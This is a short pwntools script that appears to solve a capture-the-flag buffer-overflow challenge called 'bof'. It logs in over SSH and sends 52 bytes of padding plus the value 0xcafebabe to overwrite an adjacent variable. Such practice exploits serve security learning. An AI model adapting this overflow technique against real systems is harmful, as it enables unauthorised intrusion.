#!/usr/bin/env python

from pwn import context, gdb, p32, process, ssh

ssh = ssh(user='bof', port=2222, password='guest')
p = ssh.system('./bof')

#buffer is 52 bytes away from the varaible
padding = ('A' * 52).encode()
payload = p32(0xcafebabe, endianness='little')

fullpl = padding + payload

#p = process('./bof')
p.sendline(fullpl)
print(p.recvall())
